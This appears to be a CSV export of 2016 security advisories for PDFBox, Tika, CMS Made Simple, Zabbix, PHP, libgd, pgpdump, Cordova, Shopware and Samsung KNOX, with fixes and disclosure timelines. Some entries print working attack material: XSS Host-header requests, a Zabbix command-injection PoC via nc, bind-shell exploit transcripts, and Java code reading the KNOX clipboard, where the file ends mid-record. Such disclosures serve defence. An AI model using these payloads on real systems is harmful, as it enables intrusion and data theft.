2912,[CVE-2016-2175] Apache PDFBox XML External Entity vulnerability,,CVE-2016-2175,"CVE-2016-2175: Apache PDFBox XML External Entity vulnerability
Severity: Important
Vendor:
The Apache Software Foundation
Versions Affected:
Apache PDFBox 1.8.0 to 1.8.11
Apache PDFBox 2.0.0
Earlier, unsupported Apache PDFBox versions may be affected as well
Description:
Apache PDFBox parses different XML data within PDF files such as XMP and the initialization of the XML parsers did not protect against XML External Entity (XXE) vulnerabilities. According to www.owasp.org [1]: ""This attack may lead to the disclosure of confidential data, denial of service, server side request forgery, port scanning from the perspective of the machine where the parser is located, and other system impacts.""
Mitigation:
Upgrade to Apache PDFBox 1.8.12 respectively 2.0.1
Credit:
This issue was discovered by Arthur Khashaev (https://khashaev.ru), Seulgi Kim, Mesut Timur and Microsoft Vulnerability Research.
[1] https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing"
2914,[CVE-2016-4434] Apache Tika XML External Entity vulnerability,,CVE-2016-4434,"CVE-2016-4434: Apache Tika XML External Entity vulnerability
Severity: Important
Vendor:
The Apache Software Foundation
Versions Affected:
Apache Tika 0.10 to 1.12
Description:
Apache Tika parses XML within numerous file formats. In some instances[1], the initialization ofthe XML parser or the choice of handlers did not protect against XML External Entity (XXE)
vulnerabilities. According to www.owasp.org [2]: ""This attack may lead to the disclosure of confidential data, denial of service, server side request forgery, port scanning from the perspective of the machine where the parser is located, and other system impacts.""
Mitigation:
Upgrade to Apache Tika 1.13.
Credit:
This issue was discovered by Arthur Khashaev (https://khashaev.ru), Seulgi Kim, Mesut Timur,and Microsoft Vulnerability Research.
[1] Spreadsheets in OOXML files and XMP in PDF and other file formats.
[2] https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing"
3008,CVE-2016-2784: CMS Made Simple < 2.1.3 & < 1.12.2 Web server Cache Poisoning,,CVE-2016-2784,"=============================================
Web Server Cache Poisoning in CMS Made Simple
=============================================
CVE-2016-2784
Product Description
===================
CMS Made Simple is a great tool with many plugins to publish content on the Web. It aims to
be simple to use by end users and to provide a secure and robust website.
Website: http://www.cmsmadesimple.org/
Description
===========
A remote unauthenticated attacker can insert malicious content in a CMS Made Simple
installation by poisoning the web server cache when Smarty Cache is activated by modifying
the Host HTTP Header in his request.
The vulnerability can be triggered only if the Host header is not part of the web server
routing process (e.g. if several domains are served by the same web server).
This can lead to phishing attacks because of the modification of the site's links,
defacement or Cross-Site-Scripting attacks by a lack of filtering of HTML entities in
$_SERVER variable.
**Access Vector**: remote
**Security Risk**: medium
**Vulnerability**: CWE-20
**CVSS Base score**: 5.3 (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N)
----------------
Proof of Concept
----------------
Request that shows improper HTML entities filtering and will insert
' onload='javacript:alert(Xss) in the pages :
GET / HTTP/1.1
Host: ' onload='javascrscript:ipt:alert(Xss)
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close
Request that changes the root domain for all links and allows to redirect to external
websites :
GET / HTTP/1.1
Host: www.malicious.com
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close
Solution
========
Use the variable $_SERVER['SERVER_NAME'] instead of the variable $_SERVER['HTTP_HOST']
given that the server name is correctly defined or use an application specific
constant.
Fixes
=====
Upgrade to CMS Made Simple 2.1.3 or 1.12.2.
See http://www.cmsmadesimple.org/2016/03/Announcing-CMSMS-1-12-2-kolonia and
http://www.cmsmadesimple.org/2016/04/Announcing-CMSMS-2-1-3-Black-Point for upgrade
instructions.
Mitigation : disable Smarty caching in the admin panel.
Affected Versions
=================
CMS Made Simple < 2.1.3 and < 1.12.2
Vulnerability Disclosure Timeline
=================================
02-24-2016: Vendor contacted
02-24-2016: Vulnerability confirmed by the vendor
03-01-2016: CVE identifier assigned
03-28-2016 & 04-16-2016: Vendor patch release
05-03-2016: Public Disclosure
References
==========
* https://packetstormsecurity.com/files/136897/CMS-Made-Simple-Cache-Poisoning.html
Credits
=======
* Mickaël Walter, I-Tracing (lab -at- i-tracing -dot- com)
Website: http://www.i-tracing.com/"
3014,CVE-2016-4338: Zabbix Agent 3.0.1 mysql.size shell command injection,,CVE-2016-4338,"CVE-2016-4338: Zabbix Agent 3.0.1 mysql.size shell command injection
--------------------------------------------------------------------
Affected products
=================
At least Zabbix Agent 1:3.0.1-1+wheezy from
http://repo.zabbix.com/zabbix/3.0/debian is vulnerable. Other versions
were not tested.
Background
==========
""Zabbix agent is deployed on a monitoring target to actively monitor
local resources and applications (hard drives, memory, processor
statistics etc).
The agent gathers operational information locally and reports data to
Zabbix server for further processing. In case of failures (such as a
hard disk running full or a crashed service process), Zabbix server
can actively alert the administrators of the particular machine that
reported the failure.
Zabbix agents are extremely efficient because of use of native system
calls for gathering statistical information.""
-- https://www.zabbix.com/documentation/3.0/manual/concepts/agent
Description
===========
Zabbix agent listens on port 10050 for connections from the Zabbix
server. The commands can be built-in or user-defined.
The mysql.size user parameter defined in
/etc/zabbix/zabbix_agentd.d/userparameter_mysql.conf takes three input
parameters and uses a shell script to generate an SQL query:
UserParameter=mysql.size[*],echo ""select sum($(case ""$3"" in both|"""") echo ""data_length+index_length"";; data|index) echo ""$3_length"";; free) echo ""data_free"";; esac)) from information_schema.tables$([[ ""$1"" = ""all"" || ! ""$1"" ]] || echo "" where table_schema='$1'"")$([[ ""$2"" = ""all"" || ! ""$2"" ]] || echo ""and table_name='$2'"");"" | HOME=/var/lib/zabbix mysql -N
The code assumes that /bin/sh is bash that supports the [[ compound
command. However, if /bin/sh is for example dash the statement
[[ ""$1"" = ""all"" || ! ""$1"" ]]
ends up executing the command ""$1"" with the argument ""]]"".
Exploit
=======
Zabbix sanitizes the input and blocks many dangerous characters
(""\'""`*?[]{}~$!&;()<>|#@ ""). Since we cannot use quotes we cannot
give our shell commands any parameters which significantly reduces the
impact of this vulnerability. If you find a way to execute arbitrary
commands using this flaw I'd be really interested in the details. The
following proof-of-concept shows how the vulnerability can be used
escalate privileges locally:
$ echo -en '#!/bin/bash echo ""This code is running as $(id)"" 1>&2 ' > /tmp/owned
$ chmod a+rx /tmp/owned
$ echo 'mysql.size[/tmp/owned,all,both]' | nc localhost 10050 | cat -A
ZBXD^AM-^O^@^@^@^@^@^@^@sh: 1: [[: not found$
This code is running as uid=110(zabbix) gid=114(zabbix) groups=114(zabbix)$
sh: 1: [[: not found$
sh: 1: all: not found$
The exploit of course assumes that the Server line in the
configuration includes ""127.0.0.1"". If the agent is configured to
accept connections only from the Zabbix server. In that case this
issue can only be exploited from the server or by spoofing the IP
address of the server (with for example ARP spoofing).
Since output of the command is piped to mysql it might be possible to
also execute some SQL commands in the database.
Author
======
This issue was discovered by Timo Lindfors from Nixu Corporation.
Timeline
========
2016-04-19: Issue discovered and reported internally for verification.
2016-04-21: Issue reported to vendor.
2016-04-22: Vendor acknowledges vulnerability and starts patching.
2016-04-26: Asked status update from vendor.
2016-04-26: Vendor responds that the issue is still being patched.
2016-04-26: CVE requested from MITRE.
2016-04-28: MITRE assigned CVE-2016-4338 for this vulnerability.
2016-05-02: Vendor published details in the issue tracker https://support.zabbix.com/browse/ZBX-10741"
3030,CVE-2016-3078: php: integer overflow in ZipArchive::getFrom*,,CVE-2016-3078,"Details
=======
An integer wrap may occur in PHP 7.x before version 7.0.6 when reading
zip files with the getFromIndex() and getFromName() methods of
ZipArchive, resulting in a heap overflow.
php-7.0.5/ext/zip/php_zip.c
,----
| 2679 static void php_zip_get_from(INTERNAL_FUNCTION_PARAMETERS, int type) /* {{{ */
| 2680 {
| ....
| 2684 struct zip_stat sb;
| ....
| 2689 zend_long len = 0;
| ....
| 2692 zend_string *buffer;
| ....
| 2702 if (type == 1) {
| 2703 if (zend_parse_parameters(ZEND_NUM_ARGS(), ""P|ll"", &filename, &len, &flags) == FAILURE) {
| 2704 return;
| 2705 }
| 2706 PHP_ZIP_STAT_PATH(intern, ZSTR_VAL(filename), ZSTR_LEN(filename), flags, sb); // (1)
| 2707 } else {
| 2708 if (zend_parse_parameters(ZEND_NUM_ARGS(), ""l|ll"", &index, &len, &flags) == FAILURE) {
| 2709 return;
| 2710 }
| 2711 PHP_ZIP_STAT_INDEX(intern, index, 0, sb); // (1)
| 2712 }
| ....
| 2718 if (len < 1) {
| 2719 len = sb.size;
| 2720 }
| ....
| 2731 buffer = zend_string_alloc(len, 0); // (2)
| 2732 n = zip_fread(zf, ZSTR_VAL(buffer), ZSTR_LEN(buffer)); // (3)
| ....
| 2742 }
`----
With `sb.size' from (1) being:
php-7.0.5/ext/zip/lib/zip_stat_index.c
,----
| 038 ZIP_EXTERN int
| 039 zip_stat_index(zip_t *za, zip_uint64_t index, zip_flags_t flags,
| 040 zip_stat_t *st)
| 041 {
| ...
| 043 zip_dirent_t *de;
| 044
| 045 if ((de=_zip_get_dirent(za, index, flags, NULL)) == NULL)
| 046 return -1;
| ...
| 063 st->size = de->uncomp_size;
| ...
| 086 }
`----
Both `size' and `uncomp_size' are unsigned 64bit integers:
php-7.0.5/ext/zip/lib/zipint.h
,----
| 339 struct zip_dirent {
| ...
| 351 zip_uint64_t uncomp_size; /* (cl) size of uncompressed data */
| ...
| 332 };
`----
php-7.0.5/ext/zip/lib/zip.h
,----
| 279 struct zip_stat {
| ...
| 283 zip_uint64_t size; /* size of file (uncompressed) */
| ...
| 290 };
`----
Whereas `len' is signed and has a platform-dependent size:
php-7.0.5/Zend/zend_long.h
,----
| 028 #if defined(__x86_64__) || defined(__LP64__) || defined(_LP64) || defined(_WIN64)
| 029 # define ZEND_ENABLE_ZVAL_LONG64 1
| 030 #endif
| ...
| 033 #ifdef ZEND_ENABLE_ZVAL_LONG64
| 034 typedef int64_t zend_long;
| ...
| 043 #else
| 044 typedef int32_t zend_long;
| ...
| 053 #endif
`----
Uncompressed file sizes in zip-archives may be specified as either 32-
or 64bit values; with the latter requiring that the size be specified in
the extra field in zip64 mode.
Anyway, as for the invocation of `zend_string_alloc()' in (2):
php-7.0.5/Zend/zend_string.h
,----
| 119 static zend_always_inline zend_string *zend_string_alloc(size_t len, int persistent)
| 120 {
| 121 zend_string *ret = (zend_string *)pemalloc(ZEND_MM_ALIGNED_SIZE(_ZSTR_STRUCT_SIZE(len)), persistent); // (4)
| ...
| 133 ZSTR_LEN(ret) = len; // (5)
| 134 return ret;
| 135 }
`----
The `size' argument to the `pemalloc' macro is aligned/adjusted in (4)
whilst the *original* value of `len' is stored as the size of the
allocated buffer in (5). No boundary checking is done in (4) and it may
thus wrap, which would lead to a heap overflow during the invocation of
`zip_fread()' in (3) as the `toread' argument is `ZSTR_LEN(buffer)':
php-7.0.5/Zend/zend_string.h
,----
| 041 #define ZSTR_LEN(zstr) (zstr)->len
`----
On a 32bit system:
,----
| (gdb) p/x ZEND_MM_ALIGNED_SIZE(_ZSTR_STRUCT_SIZE(0xfffffffe))
| $1 = 0x10
`----
The wraparound may also occur on 64bit systems with `uncomp_size'
specified in the extra field (Zip64 mode; ext/zip/lib/zip_dirent.c:463).
However, it won't result in a buffer overflow because of `zip_fread()'
bailing on a size that would have wrapped the allocation in (4):
php-7.0.5/ext/zip/lib/zip_fread.c
,----
| 038 ZIP_EXTERN zip_int64_t
| 039 zip_fread(zip_file_t *zf, void *outbuf, zip_uint64_t toread)
| 040 {
| ...
| 049 if (toread > ZIP_INT64_MAX) {
| 050 zip_error_set(&zf->error, ZIP_ER_INVAL, 0);
| 051 return -1;
| 052 }
| ...
| 063 }
`----
php-7.0.5/ext/zip/lib/zipconf.h
,----
| 130 #define ZIP_INT64_MAX 0x7fffffffffffffffLL
`----
,----
| (gdb) p/x ZEND_MM_ALIGNED_SIZE(_ZSTR_STRUCT_SIZE(0x7fffffffffffffff))
| $1 = 0x8000000000000018
`----
PoC
===
Against Arch Linux i686 with php-fpm 7.0.5 behind nginx [1]:
,----
| $ python exploit.py --bind-port 5555 http://1.2.3.4/upload.php
| [*] this may take a while
| [*] 103 of 4096 (0x67fd0)...
| [+] connected to 1.2.3.4:5555
|
| id
| uid=33(http) gid=33(http) groups=33(http)
|
| uname -a
| Linux arch32 4.5.1-1-ARCH #1 SMP PREEMPT Thu Apr 14 19:36:01 CEST
| 2016 i686 GNU/Linux
|
| pacman -Qs php-fpm
| local/php-fpm 7.0.5-2
| FastCGI Process Manager for PHP
|
| cat upload.php
| <?php
| $zip = new ZipArchive();
| if ($zip->open($_FILES[""file""][""tmp_name""]) !== TRUE) {
| echo ""cannot open archive "";
| } else {
| for ($i = 0; $i < $zip->numFiles; $i++) {
| $data = $zip->getFromIndex($i);
| }
| $zip->close();
| }
| ?>
`----
Solution
========
This issue has been fixed in php 7.0.6.
Footnotes
_________
[1] [https://github.com/dyntopia/exploits/tree/master/CVE-2016-3078]
--
Hans Jerry Illikainen"
3033,CVE-2015-5208 - Arbitrary plugin execution issue in Apache Cordova iOS,,CVE-2015-5208,"CVE-2015-5208 - Arbitrary plugin execution issue in Apache Cordova iOS
Severity:
High
Vendor:
The Apache Software Foundation
Versions Affected:
cordova-ios 3.9.1 and below
Description:
An arbitrary plugin can be executed when a user clicks on a link.
Upgrade path:
Developers who are concerned about this issue should install version
4.0.0 or higher of the cordova-ios platform.
Credit:
This issue was discovered by Muneaki Nishimura (nishimunea) of Recruit
Technologies Co.,Ltd."
3059,Remote Code Execution in Shopware <5.1.5 (CVE-2016-3109),,CVE-2016-3109,"CREDITS
========
This issue has been identified by David Vieira-Kurz of Immobilien Scout GmbH.
CVE
====
CVE-2016-3109
AFFECTED PRODUCT
==================
Shopware < 5.1.5 : https://en.shopware.com/
IMPACT
=======
This issue has been triaged with the highest severity (CRITICAL) by the Shopware maintainer because it allows unauthenticated remote code execution by any attacker! This means that an attacker is able to read ANY files on the target system, create new files with malicious content and run arbitrary code on the target system.
PROOF OF CONCEPT
==================
The script located at ""/backend/Login/load/"" is prone to remote code execution. A proof of concept has been sent to the maintainer and verified by the maintainer of Shopware.
For the time being we will not provide any exploit code publicly.
HOTFIX
======
https://github.com/shopware/shopware/commit/d73e9031a5b2ab6e918eb86d1e2b2e873cd3558d
TIMELINE
========
05/Apr/2016: issue has been identified
05/Apr/2016: issue has been sent to the maintainer
06/Apr/2016: maintainer has verified the issue
07/Apr/2016: maintainer sent hotfix for review
11/Apr/2016: maintainer released a hotfix (version 5.1.5)
23/Apr/2016: this advisory has been published"
3066,CVE-2016-3074: libgd: signedness vulnerability,,CVE-2016-3074,"Overview
========
libgd [1] is an open-source image library. It is perhaps primarily used
by the PHP project. It has been bundled with the default installation
of PHP since version 4.3 [2].
A signedness vulnerability (CVE-2016-3074) exist in libgd 2.1.1 which
may result in a heap overflow when processing compressed gd2 data.
Details
=======
4 bytes representing the chunk index size is stored in a signed integer,
chunkIdx[i].size, by `gdGetInt()' during the parsing of GD2 headers:
libgd-2.1.1/src/gd_gd2.c:
,----
| 53 typedef struct {
| 54 int offset;
| 55 int size;
| 56 }
| 57 t_chunk_info;
`----
libgd-2.1.1/src/gd_gd2.c:
,----
| 65 static int
| 66 _gd2GetHeader (gdIOCtxPtr in, int *sx, int *sy,
| 67 int *cs, int *vers, int *fmt, int *ncx, int *ncy,
| 68 t_chunk_info ** chunkIdx)
| 69 {
| ...
| 73 t_chunk_info *cidx;
| ...
| 155 if (gd2_compressed (*fmt)) {
| ...
| 163 for (i = 0; i < nc; i++) {
| ...
| 167 if (gdGetInt (&cidx[i].size, in) != 1) {
| 168 goto fail2;
| 169 };
| 170 };
| 171 *chunkIdx = cidx;
| 172 };
| ...
| 181 }
`----
`gdImageCreateFromGd2Ctx()' and `gdImageCreateFromGd2PartCtx()' then
allocates memory for the compressed data based on the value of the
largest chunk size:
libgd-2.1.1/src/gd_gd2.c:
,----
| 371|637 if (gd2_compressed (fmt)) {
| 372|638 /* Find the maximum compressed chunk size. */
| 373|639 compMax = 0;
| 374|640 for (i = 0; (i < nc); i++) {
| 375|641 if (chunkIdx[i].size > compMax) {
| 376|642 compMax = chunkIdx[i].size;
| 377|643 };
| 378|644 };
| 379|645 compMax++;
| ...|...
| 387|656 compBuf = gdCalloc (compMax, 1);
| ...|...
| 393|661 };
`----
A size of <= 0 results in `compMax' retaining its initial value during
the loop, followed by it being incremented to 1. Since `compMax' is
used as the nmemb for `gdCalloc()', this leads to a 1*1 byte allocation
for `compBuf'.
This is followed by compressed data being read to `compBuf' based on the
current (potentially negative) chunk size:
libgd-2.1.1/src/gd_gd2.c:
,----
| 339 BGD_DECLARE(gdImagePtr) gdImageCreateFromGd2Ctx (gdIOCtxPtr in)
| 340 {
| ...
| 413 if (gd2_compressed (fmt)) {
| 414
| 415 chunkLen = chunkMax;
| 416
| 417 if (!_gd2ReadChunk (chunkIdx[chunkNum].offset,
| 418 compBuf,
| 419 chunkIdx[chunkNum].size,
| 420 (char *) chunkBuf, &chunkLen, in)) {
| 421 GD2_DBG (printf (""Error reading comproessed chunk ""));
| 422 goto fail;
| 423 };
| 424
| 425 chunkPos = 0;
| 426 };
| ...
| 501 }
`----
libgd-2.1.1/src/gd_gd2.c:
,----
| 585 BGD_DECLARE(gdImagePtr) gdImageCreateFromGd2PartCtx (gdIOCtx * in, int srcx, int srcy, int w, int h)
| 586 {
| ...
| 713 if (!gd2_compressed (fmt)) {
| ...
| 731 } else {
| 732 chunkNum = cx + cy * ncx;
| 733
| 734 chunkLen = chunkMax;
| 735 if (!_gd2ReadChunk (chunkIdx[chunkNum].offset,
| 736 compBuf,
| 737 chunkIdx[chunkNum].size,
| 738 (char *) chunkBuf, &chunkLen, in)) {
| 739 printf (""Error reading comproessed chunk "");
| 740 goto fail2;
| 741 };
| ...
| 746 };
| ...
| 815 }
`----
The size is subsequently interpreted as a size_t by `fread()' or
`memcpy()', depending on how the image is read:
libgd-2.1.1/src/gd_gd2.c:
,----
| 221 static int
| 222 _gd2ReadChunk (int offset, char *compBuf, int compSize, char *chunkBuf,
| 223 uLongf * chunkLen, gdIOCtx * in)
| 224 {
| ...
| 236 if (gdGetBuf (compBuf, compSize, in) != compSize) {
| 237 return FALSE;
| 238 };
| ...
| 251 }
`----
libgd-2.1.1/src/gd_io.c:
,----
| 211 int gdGetBuf(void *buf, int size, gdIOCtx *ctx)
| 212 {
| 213 return (ctx->getBuf)(ctx, buf, size);
| 214 }
`----
For file contexts:
libgd-2.1.1/src/gd_io_file.c:
,----
| 52 BGD_DECLARE(gdIOCtx *) gdNewFileCtx(FILE *f)
| 53 {
| ...
| 67 ctx->ctx.getBuf = fileGetbuf;
| ...
| 76 }
| ...
| 92 static int fileGetbuf(gdIOCtx *ctx, void *buf, int size)
| 93 {
| 94 fileIOCtx *fctx;
| 95 fctx = (fileIOCtx *)ctx;
| 96
| 97 return (fread(buf, 1, size, fctx->f));
| 98 }
`----
And for dynamic contexts:
libgd-2.1.1/src/gd_io_dp.c:
,----
| 74 BGD_DECLARE(gdIOCtx *) gdNewDynamicCtxEx(int initialSize, void *data, int freeOKFlag)
| 75 {
| ...
| 95 ctx->ctx.getBuf = dynamicGetbuf;
| ...
| 104 }
| ...
| 256 static int dynamicGetbuf(gdIOCtxPtr ctx, void *buf, int len)
| 257 {
| ...
| 280 memcpy(buf, (void *) ((char *)dp->data + dp->pos), rlen);
| ...
| 284 }
`----
PoC
===
Against Ubuntu 15.10 amd64 running nginx with php5-fpm and php5-gd [3]:
,----
| $ python exploit.py --bind-port 5555 http://1.2.3.4/upload.php
| [*] this may take a while
| [*] offset 912 of 10000...
| [+] connected to 1.2.3.4:5555
| id
| uid=33(www-data) gid=33(www-data) groups=33(www-data)
|
| uname -a
| Linux wily64 4.2.0-35-generic #40-Ubuntu SMP Tue Mar 15 22:15:45 UTC
| 2016 x86_64 x86_64 x86_64 GNU/Linux
|
| dpkg -l|grep -E ""php5-(fpm|gd)""
| ii php5-fpm 5.6.11+dfsg-1ubuntu3.1 ...
| ii php5-gd 5.6.11+dfsg-1ubuntu3.1 ...
|
| cat upload.php
| <?php
| imagecreatefromgd2($_FILES[""file""][""tmp_name""]);
| ?>
`----
Solution
========
This bug has been fixed in git HEAD [4].
Footnotes
_________
[1] [http://libgd.org/]
[2] [https://en.wikipedia.org/wiki/Libgd]
[3] [https://github.com/dyntopia/exploits/tree/master/CVE-2016-3074]
[4] [https://github.com/libgd/libgd/commit/2bb97f407c1145c850416a3bfbcc8cf124e68a19]
--
Hans Jerry Illikainen"
3084,CVE-2016-4021: pgpdump 0.29 - Endless loop parsing specially crafted input (SYSS-2016-030),,CVE-2016-4021,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
Advisory ID: SYSS-2016-030
Product: pgpdump
Maintainer: Kazu Yamamoto
Affected Version(s): 0.29
Tested Version(s): 0.29
Vulnerability Type: Improper Input Validation (CWE-20)
Risk Level: Low
Solution Status: Fixed (in 0.30)
Maintainer Notification: 2016-04-12
Solution Date: 2016-04-12
Public Disclosure: 2016-04-12
CVE Reference: CVE-2016-4021
Author of Advisory: Klaus Eisentraut, SySS GmbH, https://www.syss.de/advisories/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Overview:
""pgpdump"" is a PGP packet visualizer which displays the packet format of
OpenPGP (RFC 4880) and PGP version 2 (RFC 1991) (see [1]).
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability Details:
When pgpdump is run on specially crafted input, a Denial-of-Service
condition occurs. The program runs with 100% CPU usage for an indefinite
amount of time.
This can be abused in scenarios where users can supply input to pgpdump,
e.g. in http://www.pgpdump.net/. The SySS GmbH believes that such a
scenario is rare.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Proof of Concept (PoC):
The vulnerability can be reproduced by the following command:
$ echo -en 'xa3x03' | ./pgpdump
Old: Compressed Data Packet(tag 8)
Comp alg - BZip2(comp 3)
[ ... endless loop ...]
After issuing the command above, pgpdump 0.29 is running in an endless
loop and consuming 100% CPU utilization. This happens because of missing
error and EOF checking in the function read_binary() in the C file
buffer.c.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
The SySS GmbH provides the following patch which fixes the issue and was
provided as pull request on github.com. [3]
$ git diff origin/master HEAD
diff --git a/buffer.c b/buffer.c
index 2cafc57..d7de94c 100644
- --- a/buffer.c
+++ b/buffer.c
@@ -81,8 +81,11 @@ line_not_blank(byte *s)
private int
read_binary(byte *p, unsigned int max)
{
- - /* errno */
- - return fread(p, sizeof(byte), max, stdin);
+ size_t ret = fread(p, sizeof(byte), max, stdin);
+ if (feof(stdin) | ferror(stdin)) {
+ warn_exit(""error in read_binary, maybe preliminary EOF?"");
+ }
+ return ret;
}
private int
Furthermore, the maintainer Kazu Yamamoto was contacted via email.
The modified patch has been merged by him and this vulnerability is now
fixed in version 0.30.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclosure Timeline:
2016-04-02: Vulnerability discovered
2016-04-12: Patch released by the SySS GmbH
2016-04-12: Vulnerability reported to the maintainer including patch
2016-04-13: Modified Patch merged by maintainer Kazu Yamamoto
2016-04-15: Public release of security advisory
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
References:
[1] GitHub repository of pgpdump
https://github.com/kazu-yamamoto/pgpdump
[2] SySS GmbH, SYSS-2016-030
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2016-030.txt
[3] Pull Request on github
https://github.com/kazu-yamamoto/pgpdump/pull/16
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Credits:
This security vulnerability was found by Klaus Eisentraut of the SySS
GmbH.
E-Mail: klaus.eisentraut syss de
Public Key: https://www.syss.de/fileadmin/dokumente/PGPKeys/Klaus_Eisentraut.asc
Key ID: 0xBAC677AE
Key Fingerprint: F5E8 E8E1 A414 4886 0A8B 0411 DAB0 4DB5 BAC6 77AE
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclaimer:
The information provided in this security advisory is provided ""as is""
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS Web
site.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----
iQIcBAEBCgAGBQJXEM/TAAoJENqwTbW6xneubBYQAJ1bQMH8wZvSE6nrK9oZA1gP
sqGP6ik+gLPHnAu+7cJGDC4UeMaWbOIreAD3USRPH4BM2x+tkONiuD4+WC8yITne
O95M1JknhJAAXBOXw+2aFAvZZrpqufW53gL0Lx7/9Vs4cyyVuc3xs8R087RRvLD6
0+RXSUEM8IcPVmDgunlyHz77/BmNq/eQf7s3XdJPRc+1r8nQUvIfSCPtuqkC7E2K
NzsoVNA7u9YAyZwPciP+u/NI+20sWbx8IvioD3UKXhySNCUbqErcl/mAED+3FlxP
6VSAN40IDfvte1+jNaIuWJWONF3NetopUIpdXhq8j1qh9xyvN2KRzcDAkpt79qNn
1kuiZkW80HGbnAt5AsAh64UfHxOsboFfBXt/1wD4dteVpbPZ8iVzXyYci4e2o7s1
+3W5ukXQxo/35R5FSIsrzuJycrbDgr7oPZqijupHCWT4kLSGYZWrhExkHyNFmhUO
j3nVj4Nx+civPSjQNlxhSxJguZ95DGuLJH8p1yn+HAmelq1J0h3U3AQkvnQecatF
GspvF/69sfUO56y8pYyag6E2WylfKHjUKd4te5D7hvxo1vKFxxUONIqZ+wpJtMKo
GMQAIMrRMm41WGCkNZjFd/ywDIbYueWRxmrpDpiweK/3YRK8EsuctHfSad7qMaW/
E03dkOxB6DvuqAFQjLTd
=5JJp
-----END PGP SIGNATURE-----"
3088,[CVE-2016-3996]KNOX clipboard data disclosure KNOX 1.0 - KNOX 2.3 / Android,,CVE-2016-3996,"Subject: [CVE-2016-3996]KNOX clipboard data disclosure KNOX 1.0 - KNOX 2.3 / Android
Vulnerability Description
=========================
The vulnerability allows disclosure of Clipboard data of Samsung KNOX 1.0 and 2.3 containers.
On KNOX-enabled devices there exists a proprietary service called clipboardEx which provides access to both the KNOX clipboard and the Android clipboard.
The implementation is divided into two:
1. Client: Each app that wants to use the clipboard uses the client class android.sec.clipboard.ClipboardExManager to connect to the service
2. Server: This service runs in the system_server and is implemented by com.android.server.sec.InternalClipboardExService
The following description is for KNOX 1.0.0, whereas the design in KNOX 2.3.0 is very similar and the differences will be noted at the end of this section.
- Server
The InternalClipboardExService has two important members:
* int mContainerID: The current container (mode) to which the clipboard is set. Zero is outside world and and anything except zero is KNOX. This member is initialized to zero.
* ClipboardDataMgr mDataList: A class managing the clipboard data. Located in framework2.
Each API call that involves retrieving clipboard data uses the mDataList as the clipboard.
An important method of the service is UpdateClipboardDB. Calling the method updates the mContainerID member and calls mDataList.UpdateClipboardDB(mContainerID), updating the clipboard to the new mode.
The problem is that UpdateClipboardDB doesn't check who's the caller, i.e. Anyone that knows about the service can bind to it and call this method.
The ClipboardDataMgr internally uses a android.sec.clipboard.data.file.FileManager to access clipboard data.
The clipboard data is persistent and is stored under /data/clipboard (Android) and /data/clipboard/knox (for KNOX).
All files/dirs are owned by system. Dirs are world-listable but all files underneath are only system-accessible.
Both the Android and KNOX clipboard data is stored unencrypted.
- Client
The client-side ClipboardExManager Provides the API to query the clipboardEx service.
The code for ClipboardExManager doesn't come with the SDK but is located in framework2.jar/odex under /system/framework.
In the beginning of each method the ClipboardExManager obtains an instance of android.sec.clipboard.IClipboardService and uses it to perform the API call.
IClipboardService is the AIDL-generated binder wrapper for the clipboardEx API
For example, getting the clipboard size: a call to ClipboardExManager.getDataListSize() would result in a call to IClipboardService.getDataSize().
However, before each call to the IClipboardService method, ClipboardExManager calls checkCurrentMode() which among other things calls
IClipboardService.UpdateClipboardDB(0), setting the mContainerId of the server to 0, thus not allowing access to KNOX clipboard.
It is noteworthy that ClipboardExManager doesn't provide a public API to UpdateClipboardDB.
- The Attack
In order for an attacker to get access to the KNOX clipboard all that is needed is for the service to have mContainerID != 0.
The following defences are in an attacker's way:
1. The ClipboardExManager is not in the SDK so its harder to use
2. The IClipboardService.UpdateClipboardDB isn't exported from ClipboardExManager
3. Each API call via ClipboardExManager performs checkCurrentMode() to reset the service to the appropriate container ID
These protections can be easily bypassed:
1. Extracting framework2.jar/odex from a device/ROM, studying it and using it
2. Calling via reflection the private static method ClipboardExManager.getService to get an IClipboardService instance
3. Using the APIs in IClipboardService directly instead of the wrapper methods in ClipboardExManager to avoid the calls to checkCurrentMode()
Following is code exploiting the vulnerability:
[---- Code Start ----]
Class<ClipboardExManager> clipExMngClass = ClipboardExManager.class;
Method getService = clipExMngClass.getDeclaredMethod(""getService"");
getService.setAccessible(true);
IClipboardService clipService = (IClipboardService)getService.invoke(null);
clipboardService.UpdateClipboardDB(1); // Set knox mode
�
int size = clipService.getDataSize();
System.out.println(""size = "" + size);
ClipboardData data = clipService.GetClipboardData(1);
System.out.println(""data = "" + data);
ArrayList<String> clipedStrings = clipService.getClipedStrings(0, 100);
System.out.println(""clipedStrings.size() = "" + clipedStrings.size());
System.out.println(""clipedStrings = "" + clipedStrings);
